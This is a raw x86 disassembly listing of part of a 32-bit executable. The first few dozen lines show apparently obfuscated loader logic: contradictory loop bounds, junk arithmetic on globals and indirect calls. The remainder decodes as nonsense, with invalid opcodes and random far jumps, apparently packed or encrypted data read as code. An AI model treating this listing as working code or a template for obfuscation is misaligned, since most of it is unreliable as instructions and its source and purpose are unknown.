  408905:	mov    DWORD PTR ds:0x4291f3,ecx
  40890b:	cmp    DWORD PTR ds:0x4291f3,0x1b
  408912:	jae    0x40895e
  408918:	cmp    DWORD PTR ds:0x4291f3,0xc
  40891f:	ja     0x40895e
  408925:	jmp    0x40893f
  40892a:	push   0x429197
  40892f:	push   0x429187
  408934:	push   0x5f54
  408939:	call   DWORD PTR ds:0x42a7cb
  40893f:	cmp    DWORD PTR ds:0x4291f3,0xb
  408946:	jne    0x408959
  40894c:	mov    ecx,DWORD PTR ds:0x4291f3
  408952:	inc    ecx
  408953:	mov    DWORD PTR ds:0x4291f3,ecx
  408959:	jmp    0x4088fe
  40895e:	mov    DWORD PTR [ebp-0x24],eax
  408961:	xor    DWORD PTR ds:0x42916f,ebx
  408967:	mov    eax,DWORD PTR [ebp-0x14]
  40896a:	and    DWORD PTR ds:0x42916b,0x0
  408974:	jmp    0x408986
  408979:	mov    ecx,DWORD PTR ds:0x42916b
  40897f:	inc    ecx
  408980:	mov    DWORD PTR ds:0x42916b,ecx
  408986:	cmp    DWORD PTR ds:0x42916b,0x1c
  40898d:	jae    0x4089b3
  408993:	cmp    DWORD PTR ds:0x42916b,0x2a
  40899a:	jge    0x4089b3
  4089a0:	jmp    0x4089ae
  4089a5:	push   DWORD PTR [ebp-0x14]
  4089a8:	call   DWORD PTR ds:0x42a793
  4089ae:	jmp    0x408979
  4089b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4089b6:	add    ecx,DWORD PTR [eax+0x20]
  4089b9:	sbb    DWORD PTR ds:0x429183,0x7fc6
  4089c3:	mov    DWORD PTR [ebp-0x2c],ecx
  4089c6:	mov    eax,DWORD PTR [ebp-0x14]
  4089c9:	mov    ecx,DWORD PTR [ebp+0x8]
  4089cc:	sbb    DWORD PTR ds:0x4291ef,0x4291eb
  4089d6:	add    ecx,DWORD PTR [eax+0x24]
  4089d9:	or     DWORD PTR ds:0x4291ef,0x4291f3
  4089e3:	mov    DWORD PTR [ebp-0x34],ecx
  4089e6:	jmp    0x40ad9a
  4089eb:	push   ecx
  4089ec:	mov    dl,BYTE PTR [ecx+esi*1]
  4089ef:	and    BYTE PTR [ecx+0x58598a50],0x67
  4089f6:	test   BYTE PTR [edi+ecx*8-0x5e],ch
  4089fa:	clc    
  4089fb:	(bad)  
  4089fc:	adc    eax,0x5ce88383
  408a01:	add    DWORD PTR [ebx+0x72a403ed],0xffffffd0
  408a08:	cmp    bh,dl
  408a0a:	retf   0xa98
  408a0d:	fist   DWORD PTR [edi]
  408a0f:	sbb    BYTE PTR [ebx+0x109d9e92],0xdb
  408a16:	push   cs
  408a17:	mov    ah,0x27
  408a19:	mov    eax,0xe2100e93
  408a1e:	sbb    eax,0x99386135
  408a23:	inc    ebx
  408a24:	mov    ecx,0x49045c22
  408a29:	xlat   BYTE PTR ds:[ebx]
  408a2a:	or     al,0xb
  408a2c:	push   ebp
  408a2d:	mov    bh,0x80
  408a2f:	mov    eax,0xc1f470ed
  408a34:	cmp    al,0x15
  408a36:	ret    0x714b
  408a39:	xchg   al,bl
  408a3b:	nop
  408a3c:	fst    DWORD PTR [edi+ebp*2+0x37]
  408a40:	mov    ds:0x3c956039,eax
  408a45:	(bad)  
  408a46:	jbe    0x408aae
  408a48:	aaa    
  408a49:	xlat   BYTE PTR ds:[ebx]
  408a4a:	fidiv  WORD PTR [esi+0x3108e1a6]
  408a50:	aam    0xed
  408a52:	jbe    0x408a93
  408a54:	pop    eax
  408a55:	sub    bl,bh
  408a57:	push   0x6c
  408a59:	int    0xa5
  408a5b:	aad    0x7e
  408a5d:	in     eax,dx
  408a5e:	jmp    0x408a18
  408a60:	aaa    
  408a61:	bound  esi,QWORD PTR [edi-0x3d]
  408a64:	loope  0x408a11
  408a66:	sub    esi,DWORD PTR [ebx]
  408a68:	xor    ch,BYTE PTR ds:0xe62dc150
  408a6e:	imul   eax,DWORD PTR [ecx],0xa10b668c
  408a74:	inc    ebx
  408a75:	sub    esp,DWORD PTR ds:0x31df
  408a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a7b:	pop    ds
  408a7c:	mov    dl,0x3e
  408a7e:	int    0x3b
  408a80:	(bad)  
  408a81:	mov    edx,0x9290fc49
  408a86:	cwde   
  408a87:	jno    0x408a4d
  408a89:	sti    
  408a8a:	jmp    0x429cb993
  408a8f:	mov    BYTE PTR [ebp+0x72b98f72],ch
  408a95:	adc    bl,dh
  408a97:	adc    al,0xea
  408a99:	cmp    ebx,DWORD PTR [edi-0x16]
  408a9c:	mov    bl,0x63
  408a9e:	(bad)  
  408a9f:	pop    edi
  408aa0:	(bad)  
  408aa1:	xchg   DWORD PTR [ebp+0x3],ebx
  408aa4:	out    dx,eax
  408aa5:	push   esi
  408aa6:	daa    
  408aa7:	out    0x37,al
  408aa9:	loop   0x408ac8
  408aab:	push   ebp
  408aac:	jecxz  0x408aa2
  408aae:	stc    
  408aaf:	pop    edi
  408ab0:	je     0x408ac4
  408ab2:	in     al,dx
  408ab3:	and    edx,DWORD PTR [ecx+eax*2+0x4e]
  408ab7:	cld    
  408ab8:	jnp    0x408b0e
  408aba:	adc    BYTE PTR [esi-0x48],bh
  408abd:	mov    DWORD PTR cs:[ecx+eiz*1],ebp
  408ac1:	ret    
  408ac2:	pop    edx
  408ac3:	retf   
  408ac4:	ss sbb BYTE PTR fs:[edi-0x79],bh
  408ac9:	call   0x67ee:0x51e3a9ef
  408ad0:	mov    bh,0xe8
  408ad2:	call   DWORD PTR [ebx+0x58]
  408ad5:	inc    esi
  408ad6:	arpl   WORD PTR [eax],dx
  408ad8:	lds    ecx,FWORD PTR [eax+ebx*2]
  408adb:	call   0xa9f9e41b
  408ae0:	popf   
  408ae1:	into   
  408ae2:	les    edx,FWORD PTR [ebx]
  408ae4:	inc    edi
  408ae5:	cdq    
  408ae6:	repnz in al,dx
  408ae8:	jne    0x408a92
  408aea:	call   0x60be43cb
  408aef:	mov    bl,0xee
  408af1:	(bad)  
  408af3:	cmp    eax,0xee738263
  408af8:	or     BYTE PTR [eax],0x37
  408afb:	imul   edi,DWORD PTR [ebx+0x6f],0xffffff95
  408aff:	shr    DWORD PTR [esi+0x46187d52],cl
  408b05:	cmp    DWORD PTR [ebx+ebx*4-0xa],ecx
  408b09:	test   eax,0x663c4251
  408b0e:	xor    al,0x6a
  408b10:	dec    ecx
  408b11:	ss jns 0x408b72
  408b14:	xchg   ebp,eax
  408b15:	mov    esi,DWORD PTR [ebp-0x14654ada]
  408b1b:	mov    ebp,0xd1c37236
  408b20:	and    cl,bh
  408b22:	mov    ds:0x41a0cd3c,al
  408b27:	popa   
  408b28:	shl    DWORD PTR [esi],1
  408b2a:	inc    esp
  408b2b:	push   ebp
  408b2c:	mov    esi,0x56c25bfd
  408b31:	xchg   edi,eax
  408b32:	je     0x408ae9
  408b34:	dec    edx
  408b35:	in     al,0xd0
  408b37:	add    BYTE PTR [ecx],bl
  408b39:	mov    edx,0x34971f34
  408b3e:	stc    
  408b3f:	add    DWORD PTR [edi+ebp*1],ebp
  408b42:	es jg  0x408b05
  408b45:	jle    0x408b9a
  408b47:	xchg   ah,bl
  408b49:	rol    eax,cl
  408b4b:	mov    al,ds:0xfb8f2f33
  408b50:	xchg   ecx,eax
  408b51:	jp     0x408b34
  408b53:	cmp    eax,0x9265d71d
  408b58:	cmc    
  408b59:	ret    
  408b5a:	nop
  408b5b:	fstp   QWORD PTR [ebp+0x1ab23fc6]
  408b61:	add    eax,ebp
  408b63:	imul   esp,DWORD PTR [ebx-0x3750f48d],0xa72099f
  408b6d:	das    
  408b6e:	enter  0xe023,0x60
  408b72:	pushf  
  408b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b74:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b76:	push   esi
  408b77:	jne    0x408b81
  408b79:	pop    ss
  408b7a:	dec    eax
  408b7b:	bound  edx,QWORD PTR [ecx]
  408b7d:	inc    esi
  408b7e:	adc    BYTE PTR [esi+0x65ba293f],al
  408b84:	jp     0x408b30
  408b86:	push   ds
  408b87:	pop    edi
  408b88:	xor    edi,edi
  408b8a:	jns    0x408bb7
  408b8c:	mov    dh,0x4e
  408b8e:	cmc    
  408b8f:	or     ch,bl
  408b91:	add    DWORD PTR [edi],esp
  408b93:	sub    BYTE PTR [esi],cl
  408b95:	jmp    0x569e:0x66ef34d2
  408b9c:	sahf   
  408b9d:	and    eax,0xed934fdc
  408ba2:	cmp    eax,0x2923ac5a
  408ba7:	mov    edx,0x30c58d6d
  408bac:	mov    DWORD PTR [ebp+ebp*8+0x655d4939],edx
  408bb3:	pop    es
  408bb4:	jae    0x408be5
  408bb6:	scas   al,BYTE PTR es:[edi]
  408bb7:	mov    ebx,0x697dc2f
  408bbc:	out    dx,al
  408bbd:	repz jns 0x408c3b
  408bc0:	(bad)  
  408bc1:	or     eax,DWORD PTR [edx-0x2fd3d15a]
  408bc7:	sub    DWORD PTR [edi-0x4179f6d0],ecx
  408bcd:	out    dx,eax
  408bce:	xor    BYTE PTR [edi-0x465b129b],bh
  408bd4:	mov    ecx,0x38900b0c
  408bd9:	daa    
  408bda:	push   cs
  408bdb:	cld    
  408bdc:	scas   al,BYTE PTR es:[edi]
  408bdd:	add    DWORD PTR ds:0x952b9d47,ebx
  408be3:	imul   esp,DWORD PTR [edx-0x6fe6f344],0x40f9abfc
  408bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bee:	jle    0x408c44
  408bf0:	ins    DWORD PTR es:[edi],dx
  408bf1:	xor    ebx,DWORD PTR [esi]
  408bf3:	pop    ds
  408bf4:	fidivr DWORD PTR [ecx-0x4e]
  408bf7:	sub    ebp,DWORD PTR [ebx-0x18]
  408bfa:	mov    bl,BYTE PTR [ecx]
  408bfc:	mov    ebp,ecx
  408bfe:	into   
  408bff:	push   esi
  408c00:	jp     0x408bf3
  408c02:	and    eax,0x18be22ad
  408c07:	dec    edi
  408c08:	dec    esi
  408c09:	lea    edi,[edi+0x176e0b6]
  408c0f:	ins    DWORD PTR es:[edi],dx
  408c10:	sbb    edx,edi
  408c12:	or     DWORD PTR [edi-0x5bfcbed6],eax
  408c18:	mov    DWORD PTR [eax*1+0x7b6c294b],esp
  408c1f:	sahf   
  408c20:	or     DWORD PTR [edx+edi*2-0x3f29c4b4],edi
  408c27:	sbb    bl,BYTE PTR [ebp-0x604281f8]
  408c2d:	gs dec ebp
  408c2f:	je     0x408c49
  408c31:	jmp    0x408ca3
  408c33:	xchg   bp,ax
  408c35:	mov    ah,0x81
  408c37:	pop    eax
  408c38:	xchg   ecx,eax
  408c39:	mov    edi,0x2bc21fe8
  408c3e:	inc    DWORD PTR [edi+edx*4+0x62]
  408c42:	sub    bh,BYTE PTR [ebp-0x5a]
  408c45:	stos   DWORD PTR es:[edi],eax
  408c46:	xchg   edi,eax
  408c47:	mov    ecx,0xba8e21fc
  408c4c:	inc    esi
  408c4d:	mov    edx,0x84641d5e
  408c52:	inc    ecx
  408c53:	dec    ebx
  408c54:	clc    
  408c55:	fisubr DWORD PTR [ebx]
  408c57:	jle    0x408c6e
  408c59:	cmp    eax,0x4c93dff3
  408c5e:	add    DWORD PTR [edx],0xdaee3a90
  408c64:	jae    0x408c61
  408c66:	jmp    DWORD PTR [esi-0x66123369]
  408c6c:	jecxz  0x408c56
  408c6e:	fdivr  QWORD PTR [edi+0x7b]
  408c71:	sbb    BYTE PTR [ebx-0x5c],ch
  408c74:	xchg   DWORD PTR [ebx],ebx
  408c76:	xor    al,0xd7
  408c78:	je     0x408c20
  408c7a:	add    al,0xf7
  408c7c:	cmp    eax,0xfd9f9731
  408c81:	mov    edx,0xadbb3c24
  408c86:	push   edi
  408c87:	inc    edx
  408c88:	ins    DWORD PTR es:[edi],dx
  408c89:	jno    0x408cb7
  408c8b:	jbe    0x408c38
  408c8d:	or     BYTE PTR [edx-0x6d],dl
  408c90:	sub    BYTE PTR [ebx],dh
  408c92:	add    DWORD PTR [ecx+0x0],esi
  408c95:	jmp    0x1c6c:0x9b72cf3f
  408c9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c9e:	pop    edi
  408c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca0:	mov    cl,al
  408ca2:	xor    dl,BYTE PTR [ebp+0x43]
  408ca5:	mov    ah,BYTE PTR [esi+0x6f4c4a48]
  408cab:	cmp    DWORD PTR [edi+esi*1-0x3c],esp
  408caf:	cmp    ecx,DWORD PTR [edi]
  408cb1:	and    dh,BYTE PTR gs:[ebp-0xd4a21d]
  408cb8:	and    eax,0x826794e3
  408cbd:	mul    eax
  408cbf:	add    eax,0xbae949c3
  408cc4:	cmp    bl,BYTE PTR [edi-0x3d29e92b]
  408cca:	inc    eax
  408ccb:	push   esi
  408ccc:	push   0xffffff92
  408cce:	das    
  408ccf:	jnp    0x408c84
  408cd1:	sub    BYTE PTR [edx+0x43d9d8aa],0xf0
  408cd8:	xor    DWORD PTR [ecx+0x3465bbc3],ebp
  408cde:	push   0xccccde9f
  408ce3:	cmp    al,0x4d
  408ce5:	lahf   
  408ce6:	scas   eax,DWORD PTR es:[edi]
  408ce7:	cld    
  408ce8:	or     al,0xdd
  408cea:	cwde   
  408ceb:	lods   al,BYTE PTR ds:[esi]
  408cec:	or     DWORD PTR [edx+0x3614babd],ecx
  408cf2:	bound  eax,QWORD PTR [eax-0x6a]
  408cf5:	ins    BYTE PTR es:[edi],dx
  408cf6:	aam    0x31
  408cf8:	je     0x408d08
  408cfa:	mov    esi,0x37e96737
  408cff:	rol    ecx,0x68
  408d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d03:	pusha  
  408d04:	xchg   esp,eax
  408d05:	mov    cl,0x9c
  408d07:	fist   DWORD PTR [edx+0x3e]
  408d0a:	fcom   QWORD PTR [eax-0x14]
  408d0d:	inc    ebx
  408d0e:	call   0xe8b14b78
  408d13:	in     al,0xa7
  408d15:	addr16 jns 0x408cfd
  408d18:	dec    esp
  408d19:	js     0x408d62
  408d1b:	mov    ebx,0xf40860b5
  408d20:	cmp    edx,eax
  408d22:	inc    esi
  408d23:	push   es
  408d24:	lahf   
  408d25:	mov    ds:0xdeb964fd,eax
  408d2a:	jl     0x408da4
  408d2c:	xor    ah,BYTE PTR ds:0xba9e4d2c
  408d32:	push   ebx
  408d33:	push   esp
  408d34:	and    al,0x9c
  408d36:	inc    edx
  408d37:	add    eax,0x1739e156
  408d3c:	add    eax,0xf0dbfc91
  408d41:	inc    ecx
  408d42:	xor    BYTE PTR [esi+0x159fd5a9],bh
  408d48:	imul   ebx,DWORD PTR [edi],0x7b
  408d4b:	jp     0x408db4
  408d4d:	and    eax,0x6f9f82e1
  408d52:	daa    
  408d53:	and    cl,bh
  408d55:	ds xor eax,0x98bbea7e
  408d5b:	not    BYTE PTR [eax]
  408d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d5e:	in     eax,0x4b
  408d60:	int3   
  408d61:	add    dl,dl
  408d63:	clc    
  408d64:	aam    0x4e
  408d66:	or     BYTE PTR [ebp-0xd],0xe3
  408d6a:	ror    DWORD PTR [edi],cl
  408d6c:	int3   
  408d6d:	cld    
  408d6e:	sbb    al,BYTE PTR [edx]
  408d70:	mov    ecx,0xa45c3007
  408d75:	(bad)  
  408d76:	cmp    BYTE PTR [ebx-0x516ab3ee],ch
  408d7c:	mov    DWORD PTR [edi],ecx
  408d7e:	or     al,0xb2
  408d80:	mov    dl,0xea
  408d82:	pop    es
  408d83:	loop   0x408d2c
  408d85:	shl    bh,cl
  408d87:	dec    eax
  408d88:	aam    0x82
  408d8a:	add    DWORD PTR [ebx+0x3dda7e36],eax
  408d90:	push   edi
  408d91:	push   0xd39751b
  408d96:	sbb    ebp,esp
  408d98:	push   0x2c
  408d9a:	lock cli 
  408d9c:	jg     0x408da6
  408d9e:	(bad)  
  408d9f:	test   eax,0xcc78aa62
  408da4:	loop   0x408d69
  408da6:	(bad)  
  408da9:	aad    0x6e
  408dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dac:	xchg   BYTE PTR [eax+0x38d29b55],bl
  408db2:	push   edx
  408db3:	add    al,0xba
  408db5:	or     esi,ebp
  408db7:	lods   al,BYTE PTR ds:[esi]
  408db8:	xchg   ebp,ebp
  408dba:	out    0x5f,al
  408dbc:	adc    BYTE PTR [eax],bl
  408dbe:	mov    ebp,0x6d4d2fac
  408dc3:	xor    BYTE PTR [edi-0x52],bl
  408dc6:	and    bh,bl
  408dc8:	in     al,0x90
  408dca:	adc    al,0x69
  408dcc:	fcmovbe st,st(5)
  408dce:	lock test eax,0x8b5b2179
  408dd4:	call   0xeece08ae
  408dd9:	xchg   edx,eax
  408dda:	jp     0x408df1
  408ddc:	push   ebx
  408ddd:	sbb    ebp,DWORD PTR [edx-0x1]
  408de0:	neg    edi
  408de2:	push   edx
  408de3:	inc    esp
  408de4:	imul   ebp,DWORD PTR [edi],0xf7539fd1
  408dea:	xlat   BYTE PTR ds:[ebx]
  408deb:	mov    bl,0x95
  408ded:	lock fcmove st,st(3)
  408df0:	mov    ebx,0x9aec34d5
  408df5:	and    eax,0xa5c19824
  408dfa:	out    dx,eax
  408dfb:	add    BYTE PTR [ebp-0x47],bl
  408dfe:	jp     0x408df9
  408e00:	inc    edi
  408e01:	lea    eax,[esi]
  408e03:	sbb    ch,0xde
  408e06:	pusha  
  408e07:	add    eax,0xdec562b3
  408e0c:	imul   DWORD PTR [eax-0x1ee66b67]
  408e12:	iret   
  408e13:	pop    es
  408e14:	sahf   
  408e15:	xor    BYTE PTR [esi-0x45affa16],ah
  408e1b:	adc    eax,0xad911ee3
  408e20:	inc    eax
  408e21:	sahf   
  408e22:	js     0x408e40
  408e24:	je     0x408e40
  408e26:	mov    ds:0x1b722de9,al
  408e2b:	ror    ah,0xca
  408e2e:	mov    DWORD PTR [edx],edx
  408e30:	cdq    
  408e31:	pop    ss
  408e32:	add    BYTE PTR [ecx-0x43b05bb9],cl
  408e38:	dec    edi
  408e39:	jmp    0x53d2d8d1
  408e3e:	mov    ebx,0x8cf4ddc4
  408e43:	daa    
  408e44:	daa    
  408e45:	pop    ss
  408e46:	(bad)  [ebx-0x78]
  408e49:	mov    esp,ebx
  408e4b:	inc    esp
  408e4c:	test   ebx,0x7d42453d
  408e52:	pop    es
  408e53:	cmp    BYTE PTR [edx-0x38d5b637],al
  408e59:	hlt    
  408e5a:	xor    BYTE PTR [ebx],bl
  408e5c:	retf   0x881
  408e5f:	mov    ebp,0xf61dab09
  408e64:	repz and BYTE PTR [esp+ebp*1-0x5626687c],dl
  408e6c:	dec    ecx
  408e6d:	in     eax,0xc
  408e6f:	scas   al,BYTE PTR es:[edi]
  408e70:	mov    cl,0xf4
  408e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e73:	pop    esp
  408e74:	mov    ah,0xcb
  408e76:	inc    edx
  408e77:	ds mov esi,0xa4ce6267
  408e7d:	into   
  408e7e:	mul    BYTE PTR [eax-0x29a2a437]
  408e84:	mov    eax,ds:0xa8c3ad9f
  408e89:	mov    edx,ss
  408e8b:	repz or BYTE PTR [ebp+0x45],bl
  408e8f:	cmc    
  408e90:	jg     0x408efa
  408e92:	mov    esi,0x68e535b5
  408e97:	lds    edx,FWORD PTR [edi-0x6f3675b]
  408e9d:	popf   
  408e9e:	cs gs pop edi
  408ea1:	ins    BYTE PTR es:[edi],dx
  408ea2:	jno    0x408eb4
  408ea4:	xor    edx,0x260e1f2c
  408eaa:	inc    ebp
  408eab:	pusha  
  408eac:	in     al,0x93
  408eae:	stos   BYTE PTR es:[edi],al
  408eaf:	shl    bh,0x50
  408eb2:	cmp    DWORD PTR [edi+0x42],esp
  408eb5:	sub    DWORD PTR [esi-0x16],edi
  408eb8:	pop    esi
  408eb9:	jge    0x408f23
  408ebb:	jg     0x408f23
  408ebd:	std    
  408ebe:	imul   ecx,DWORD PTR [eax-0x767f1b25],0x40
  408ec5:	adc    eax,0x5ce76bf6
  408eca:	mov    gs,WORD PTR [edx+0x47]
  408ecd:	and    al,bh
  408ecf:	inc    edx
  408ed0:	clc    
  408ed1:	pop    ss
  408ed2:	sbb    eax,0x3a2107c
  408ed7:	jmp    0x408e84
  408ed9:	inc    esp
  408eda:	or     al,0xef
  408edc:	aas    
  408edd:	push   eax
  408ede:	push   esp
  408edf:	mov    WORD PTR [edi],es
  408ee1:	add    DWORD PTR [ebx+ebx*4],0xffffffa2
  408ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee6:	lock mov esi,0x51f0bde4
  408eec:	icebp  
  408eed:	sbb    al,0x1d
  408eef:	pop    ecx
  408ef0:	call   0x74b1:0x42237d34
  408ef7:	pop    edi
  408ef8:	mov    ?,WORD PTR [eax-0x5f724f9d]
  408efe:	mov    ebx,0x94a1e70f
  408f03:	jbe    0x408f19
  408f05:	daa    
  408f06:	cmp    esp,ecx
  408f08:	lods   eax,DWORD PTR ds:[esi]
  408f09:	(bad)  
  408f0a:	popa   
  408f0b:	arpl   WORD PTR [esi+0x7dc5ea72],dx
  408f11:	hlt    
  408f12:	mov    dl,0xa
  408f14:	mov    cl,0xb6
  408f16:	test   al,0xa0
  408f18:	push   0x88a98764
  408f1d:	mov    WORD PTR [eax],gs
  408f1f:	adc    DWORD PTR ds:0xb35fcf9c,0x5b
  408f26:	xchg   DWORD PTR [esi-0x77],ebx
  408f29:	push   ss
  408f2a:	dec    edi
  408f2b:	jno    0x408ef1
  408f2d:	sub    DWORD PTR [ebx],edx
  408f2f:	and    DWORD PTR [edi+eax*1-0x947c31f],0xffffff87
  408f37:	sbb    al,0x85
  408f39:	mov    bl,0x44
  408f3b:	fs push esi
  408f3d:	sbb    eax,0x4aaf6bda
  408f42:	add    DWORD PTR [ebx-0x16],esp
  408f45:	cs add al,0xca
  408f48:	pop    ds
  408f49:	lahf   
  408f4a:	mov    ah,0x2b
  408f4c:	je     0x408f6b
  408f4e:	cld    
  408f4f:	xor    BYTE PTR [eax],cl
  408f51:	popa   
  408f52:	cs js  0x408f9d
  408f55:	add    eax,0xf5ab5bab
  408f5a:	mov    DWORD PTR [esi],edi
  408f5c:	mov    ds:0xb238a8d1,eax
  408f61:	push   esi
  408f62:	mov    WORD PTR [esi-0x4b754921],?
  408f68:	(bad)  
  408f6a:	mov    eax,ds:0x514563f9
  408f6f:	dec    edi
  408f70:	xor    eax,0xd912835d
  408f75:	ins    BYTE PTR es:[edi],dx
  408f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f77:	(bad)  
  408f78:	lahf   
  408f79:	(bad)  
  408f7a:	jae    0x408f21
  408f7c:	shl    DWORD PTR [esi+0x674f6d70],cl
  408f82:	jmp    0x408f43
  408f84:	js     0x408ffb
  408f86:	mov    al,ds:0x87dc8ab
  408f8b:	jbe    0x408f9f
  408f8d:	std    
  408f8e:	jge    0x408fe3
  408f90:	mov    BYTE PTR [edi+0x5ed66fa7],bh
  408f96:	push   edi
  408f97:	jne    0x408f96
  408f99:	test   DWORD PTR [ebp-0x4d],0x3b517801
  408fa0:	ret    0x105d
  408fa3:	pusha  
  408fa4:	cli    
  408fa5:	cmp    ah,dh
  408fa7:	cld    
  408fa8:	fdivr  DWORD PTR [ebx+0x75]
  408fab:	mov    ebx,DWORD PTR [ecx]
  408fad:	jae    0x408fdb
  408faf:	mov    eax,ds:0x7876d0e7
  408fb4:	into   
  408fb5:	lods   al,BYTE PTR ds:[esi]
  408fb6:	icebp  
  408fb7:	hlt    
  408fb8:	jb     0x409039
  408fba:	xchg   ecx,eax
  408fbb:	lea    edi,ds:0x18858256
  408fc1:	sub    al,0xf2
  408fc3:	pop    edi
  408fc4:	pop    edi
  408fc5:	mov    cl,0x28
  408fc7:	sbb    al,0x74
  408fc9:	xchg   ebp,eax
  408fca:	sbb    DWORD PTR [ebx+0x48],ebp
  408fcd:	stc    
  408fce:	cmp    BYTE PTR [edi],bh
  408fd0:	dec    ebx
  408fd1:	hlt    
  408fd2:	fstp   TBYTE PTR [edx+0x324aeffa]
  408fd8:	mov    DWORD PTR [ebx+0x77],edi
  408fdb:	xchg   ebx,eax
  408fdc:	pushf  
  408fdd:	ret    
  408fde:	jg     0x408fe4
  408fe0:	or     ebp,DWORD PTR fs:[ecx+0x7c119723]
  408fe7:	sbb    eax,0xaaeeef56
  408fec:	mov    ah,0xbf
  408fef:	cmp    eax,0xa1c0e6c
  408ff4:	push   ebp
  408ff5:	adc    DWORD PTR [edx],0xf077fc2e
  408ffb:	inc    BYTE PTR [ebx+0x19d22e5e]
  409001:	sub    dh,ah
  409003:	pop    ebx
  409004:	fdivr  QWORD PTR [ebx]
  409006:	mov    edi,0x56cfd061
  40900b:	fs inc eax
  40900d:	fiadd  DWORD PTR [esi]
  40900f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409010:	daa    
  409011:	popa   
  409012:	mov    esi,0x7ce66776
  409017:	nop
  409018:	dec    edi
  409019:	jp     0x409051
  40901b:	cmc    
  40901c:	aas    
  40901d:	sti    
  40901e:	adc    al,0xb1
  409020:	inc    esp
  409021:	jno    0x408fbe
  409023:	pusha  
  409024:	and    BYTE PTR [esi-0x25],0x5
  409028:	xchg   esp,eax
  409029:	or     DWORD PTR [esi],0x1008c25c
  40902f:	jnp    0x40906f
  409031:	adc    BYTE PTR ds:0xf332ca2d,dl
  409037:	ja     0x409042
  409039:	mov    ds:0xf5ecb47f,eax
  40903e:	clc    
  40903f:	aaa    
  409040:	jmp    0x408fd9
  409042:	in     eax,0xd2
  409044:	lods   eax,DWORD PTR ds:[esi]
  409045:	mov    ebp,0xf7f697af
  40904a:	pop    ecx
  40904b:	fwait
  40904c:	loop   0x40900a
  40904e:	(bad)  
  409050:	js     0x409073
  409052:	les    ebx,FWORD PTR [eax+esi*4+0x4f]
  409056:	nop
  409057:	or     eax,0xe70cd8c9
  40905c:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40905e:	jmp    0x36b0:0x8c44bf69
  409065:	sbb    ebp,edx
  409067:	mov    al,ds:0x58a4e77b
  40906c:	inc    esp
  40906d:	ret    0xe7e3
  409070:	(bad)  
  409071:	adc    edi,DWORD PTR [ebx+0x2f]
  409074:	cmovns ebp,DWORD PTR ds:0x4ab56bff
  40907b:	cmp    DWORD PTR [edx+0x54],esi
  40907e:	fwait
  40907f:	aas    
  409080:	jmp    0xe6f5e00
  409085:	mov    ds:0x22dadc5e,al
  40908a:	jno    0x409057
  40908c:	sbb    cl,BYTE PTR [ecx+esi*8+0x58059f3b]
  409093:	push   eax
  409094:	fstp   DWORD PTR [esi+0x78345fc4]
  40909a:	jecxz  0x40905c
  40909c:	test   eax,0xdf5a63b3
  4090a1:	into   
  4090a2:	imul   ecx,DWORD PTR [esi+0x260db1db],0xffffffc5
  4090a9:	stos   BYTE PTR es:[edi],al
  4090aa:	ins    BYTE PTR es:[edi],dx
  4090ab:	shr    DWORD PTR [ebx+0x7ed2644d],0xa7
  4090b2:	outs   dx,DWORD PTR ds:[esi]
  4090b3:	fsub   QWORD PTR [edx-0x7a]
  4090b6:	mov    WORD PTR [ebx],?
  4090b8:	call   0xe004:0xb993ae32
  4090bf:	shr    DWORD PTR [edx-0x54],cl
  4090c2:	test   eax,0xad02803e
  4090c7:	test   al,0x4c
  4090c9:	or     esi,esi
  4090cb:	adc    eax,DWORD PTR [ebp-0x2720da1a]
  4090d1:	fwait
  4090d2:	mov    eax,eax
  4090d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090d5:	adc    al,0x8
  4090d7:	pop    esp
  4090d8:	ins    BYTE PTR es:[edi],dx
  4090d9:	aad    0x52
  4090db:	jmp    0x90483ff8
  4090e0:	push   edi
  4090e1:	pop    es
  4090e2:	hlt    
  4090e3:	sub    al,0xe3
  4090e5:	xor    eax,0x4f27455e
  4090eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090ec:	retf   
  4090ed:	lods   eax,DWORD PTR ds:[esi]
  4090ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090ef:	jne    0x4090ef
  4090f1:	mov    ah,0x6c
  4090f3:	enter  0xa7a5,0x6b
  4090f7:	add    DWORD PTR [ecx-0x122e0115],edi
  4090fd:	inc    ecx
  4090fe:	std    
  4090ff:	push   esi
  409100:	pop    eax
  409101:	jmp    0x3d25:0xd8b3a567
  409108:	fisubr WORD PTR [edi]
  40910a:	jo     0x409124
  40910c:	aaa    
  40910d:	dec    ebx
  40910e:	inc    ecx
  40910f:	jmp    0x4e11:0x63cd86b1
  409116:	sbb    DWORD PTR [ebx],esp
  409118:	rol    BYTE PTR [esi+0x8],0x90
  40911c:	lahf   
  40911d:	and    dh,BYTE PTR [eax]
  40911f:	scas   al,BYTE PTR es:[edi]
  409120:	or     DWORD PTR [ebx],edx
  409122:	fcom   QWORD PTR [ecx]
  409124:	ret    0x6d9b
  409127:	inc    esi
  409128:	pop    ecx
  409129:	sbb    BYTE PTR [esi],bh
  40912b:	enter  0x3a3d,0x7b
  40912f:	xor    DWORD PTR [ebx+0x3],esp
  409132:	std    
  409133:	dec    ebx
  409134:	iret   
  409135:	xchg   ebp,eax
  409136:	pop    ebx
  409137:	sbb    ebp,eax
  409139:	jne    0x4090cb
  40913b:	nop
  40913c:	pusha  
  40913d:	mov    ch,0x22
  40913f:	xor    ebx,DWORD PTR [ecx]
  409141:	jne    0x4091b6
  409143:	push   esi
  409144:	push   0x8
  409146:	ins    DWORD PTR es:[edi],dx
